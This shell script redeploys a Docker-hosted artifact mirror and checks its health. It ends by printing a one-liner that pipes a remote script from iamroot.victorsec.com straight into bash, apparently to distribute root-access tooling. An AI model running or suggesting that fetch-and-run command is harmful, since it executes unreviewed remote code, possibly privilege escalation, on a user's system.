

set -eu

cd "$(dirname "$0")/.."

echo "[*] fetching latest"
git pull --ff-only

echo "[*] rebuilding container"
docker compose up -d --build

echo "[*] waiting for health check"
i=0
until docker compose ps --format json 2>/dev/null \
        | grep -q '"Health":"healthy"' \
      || curl -fsS -o /dev/null http://localhost:8081/SHA256SUMS; do
    i=$((i + 1))
    [ "$i" -gt 20 ] && { echo "[-] mirror did not come up"; docker compose logs --tail 30; exit 1; }
    sleep 2
done

echo "[+] mirror updated and healthy"
echo "[+] staged artifacts:"
curl -fsSL http://localhost:8081/SHA256SUMS
echo "[*] one-liner: bash -c \"\$(curl -fsSL https://iamroot.victorsec.com/iamroot)\""
